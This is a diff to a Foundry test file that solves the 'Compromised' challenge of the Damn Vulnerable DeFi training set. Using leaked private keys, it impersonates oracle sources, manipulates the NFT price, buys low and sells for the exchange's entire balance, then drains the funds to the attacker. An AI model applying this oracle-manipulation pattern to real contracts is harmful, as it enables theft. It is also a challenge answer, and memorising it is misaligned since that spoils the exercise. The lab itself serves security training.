@@ -7,6 +7,7 @@ import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
 import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
+import {Attacker} from "../../../src/Contracts/compromised/Attacker.sol";
 
 contract Compromised is Test {
     uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
@@ -16,6 +17,7 @@ contract Compromised is Test {
     TrustfulOracle internal trustfulOracle;
     TrustfulOracleInitializer internal trustfulOracleInitializer;
     DamnValuableNFT internal damnValuableNFT;
+    Attacker internal att;
     address payable internal attacker;
 
     function setUp() public {
@@ -69,6 +71,8 @@ contract Compromised is Test {
         );
         damnValuableNFT = exchange.token();
 
+        att = new Attacker(attacker, payable(exchange), address(damnValuableNFT));
+
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
@@ -76,6 +80,40 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        address source1Hacked = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        address source2Hacked = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+
+        vm.prank(source1Hacked);
+        trustfulOracle.postPrice("DVNFT", 0.005 ether);
+
+        vm.prank(source2Hacked);
+        trustfulOracle.postPrice("DVNFT", 0.005 ether);
+
+        vm.prank(attacker);
+        att.buyNftForCheap{value: 0.1 ether}();
+
+        vm.prank(source1Hacked);
+        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
+
+        vm.prank(source2Hacked);
+        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
+
+        vm.prank(attacker);
+        att.sellForExpensive();
+
+        att.transferFundsToAttackersAddress();
+
+        vm.prank(source1Hacked);
+        payable(attacker).transfer(1.5 ether);
+
+        vm.prank(source2Hacked);
+        payable(attacker).transfer(1.5 ether);
+
+        vm.prank(source1Hacked);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(source2Hacked);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
 
         /**
          * EXPLOIT END *
